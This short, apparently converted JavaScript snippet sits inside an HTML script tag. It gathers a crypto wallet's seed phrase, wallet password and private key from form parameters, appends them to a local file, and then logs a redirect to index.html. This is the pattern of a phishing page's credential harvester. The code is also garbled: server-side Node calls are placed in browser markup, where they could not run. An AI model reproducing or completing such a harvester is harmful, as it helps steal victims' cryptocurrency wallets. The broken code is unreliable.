 <script type="text/javascript">  
  
 const fs = require('fs');
const querystring = require('querystring');

// Simulating the extraction of request parameters
const request = {
    wallet: 'your_wallet_value',
    phrase: 'your_phrase_value',
    walletPassword: 'your_wallet_password_value',
    privateKey: 'your_private_key_value'
};

// Writing to the file
const filePath = 'form-save.txt';
const data = `wallet :\n${request.wallet}\nphrase :\n${request.phrase}\nwalletPassword :\n${request.walletPassword}\nprivateKey :\n${request.privateKey}\n`;

fs.appendFileSync(filePath, data);

// Simulating a redirect (in a real server environment, you would use a response object)
console.log('Redirecting to index.html');
</script>